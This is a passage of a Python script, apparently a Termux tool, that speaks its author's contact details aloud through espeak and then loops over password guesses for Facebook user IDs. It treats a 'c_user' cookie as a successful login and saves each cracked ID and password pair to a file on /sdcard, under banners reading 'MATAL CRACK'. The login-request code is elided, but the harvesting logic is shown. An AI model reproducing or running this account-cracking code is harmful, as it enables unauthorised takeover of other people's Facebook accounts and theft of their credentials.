# ASSALAMUALAIKUM 
# SCRIPT NEOWAR JONNO MATAL BREND  💙
import os
print("\033[1;92m [[[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]]] MATAL BREND  CYBER (ROBOT) SYSTEM INSTALL. . . . \033[1;30m")
os.system("pkg install espeak")
print("\033[1;92m   [[[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]]] ROBOT INSTALL COMPLETE \033[1;30m")
os.system('espeak -a 300 "Robot install complete"')
print("\033[1;92m   [[[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]]] UPDATE CHECKING BOSS MATAL BREND CYBER KING MATAL BREND\033[1;30m")
os.system('espeak -a 300 "WAITING FOR UPDATE BANGlADESH MATAL BREND CYBER KING OFF MATAL BREND "')
os.system("git pull")
...
___       ___      _   __________   _     ____         ________  ________   __________ ___      ___________   
`MMb     dMM'     dM.  MMMMMMMMMM  dM.    `MM'         `MMMMMMMb.`MMMMMMMb. `MMMMMMMMM `MM\     `M'`MMMMMMMb. 
 MMM.   ,PMM     ,MMb  /   MM   \ ,MMb     MM           MM    `Mb MM    `Mb  MM      \  MMM\     M  MM    `Mb 
 M`Mb   d'MM     d'YM.     MM     d'YM.    MM           MM     MM MM     MM  MM         M\MM\    M  MM     MM 
 M YM. ,P MM    ,P `Mb     MM    ,P `Mb    MM           MM    .M9 MM     MM  MM    ,    M \MM\   M  MM     MM 
 M `Mb d' MM    d'  YM.    MM    d'  YM.   MM           MMMMMMM(  MM    .M9  MMMMMMM    M  \MM\  M  MM     MM 
 M  YM.P  MM   ,P   `Mb    MM   ,P   `Mb   MM           MM    `Mb MMMMMMM9'  MM    `    M   \MM\ M  MM     MM 
 M  `Mb'  MM   d'    YM.   MM   d'    YM.  MM           MM     MM MM  \M\    MM         M    \MM\M  MM     MM 
 M   YP   MM  ,MMMMMMMMb   MM  ,MMMMMMMMb  MM           MM     MM MM   \M\   MM         M     \MMM  MM     MM 
 M   `'   MM  d'      YM.  MM  d'      YM. MM    / 68b  MM    .M9 MM    \M\  MM      /  M      \MM  MM    .M9 
_M_      _MM_dM_     _dMM__MM_dM_     _dMM_MMMMMMM Y89 _MMMMMMM9'_MM_    \M\_MMMMMMMMM _M_      \M _MMMMMMM9' 
                                                    9                                                         
                                                   /                                                          
...
\033[38;5;46m║[🔵]\x1b[38;5;196m𝐀𝐔𝐓𝐇𝐎𝐑   ║  ࿇⃝🌹⃢R🌹⃝࿇  \033[38;5;46m║\033[38;5;46mHRidoy Raza            ║
\033[38;5;46m║[🔵]\x1b[38;5;196m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 ║  ࿇⃝🌹⃢X🌹⃝࿇  \033[38;5;46m║\033[38;5;46mRJ Hridoy Sarker    ║
\033[38;5;46m║[🔵]\x1b[38;5;196m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 ║  ࿇⃝🌹⃢J🌹⃝࿇  \033[38;5;46m║\033[38;5;46m01887527509     ║
\033[38;5;46m║[🔵]\x1b[38;5;196m𝐆𝐈𝐓𝐇𝐔𝐁   ║  ࿇⃝🌹⃢I🌹⃝࿇  \033[38;5;46m║\033[38;5;46mMATAL-BREND ║
\033[38;5;46m║[🔵]\x1b[38;5;196m𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌 ║  ࿇⃝🌹⃢B🌹⃝࿇  \033[38;5;46m║\033[38;5;46m01887527509    ║
\033[38;5;46m║[🔵]\x1b[38;5;196m𝐈𝐌𝐎      ║  ࿇⃝🌹⃢O🌹⃝࿇  \033[38;5;46m║\033[38;5;46m01887527509     ║
\033[38;5;46m║[🔵]\x1b[38;5;196m𝐅𝐑𝐎𝐌     ║  ࿇⃝🌹⃢𝐍⃢🌹⃝࿇ \033[38;5;46m ║\033[38;5;46m𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄𝐒𝐇.v.....10.2      ║
\x1b[38;5;196m╚═════════════╝  ࿇⃝🌹⃢J🌹⃝࿇  \033[38;5;46m╚══════════════════╝""")
os.system('espeak -a 300 "H R I D O Y "')
os.system('espeak -a 300 "Facebook  h r i d o y "')
os.system('espeak -a 300 "whathapp 0 1 8 8 7 5 2 7 5 0 9 "')
os.system('espeak -a 300 "github MATAL-BREND "')
os.system('espeak -a 300 "telegram 0 1 8 8 7 5 2 7 5 0 9 "')
os.system('espeak -a 300 "imo 0 1 8 8 7 5 2 7 5 0 9 "')
os.system('espeak -a 300 "from Bangladesh "')
os.system('espeak -a 300 "WELCOME Assalamu Alaikum I MATAL,BREND will fast in the month of Ramadan inshallah"')
def linex():
	print('\033[1;94m✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺')
loop = 0
oks = []
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[38;5;46m [HRIDOY💔] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/\033[38;5;46MATAL-BREND.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        brand=random.choice(['MATAL CYBER','MATAL-CYBER ','MATAL CRACK '])
        ...
        sys.stdout.flush()
        sys.stdout.write(f'\r\r%s {x}[{xr}\033[38;5;46mMATAL-BREND💥{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
xxr()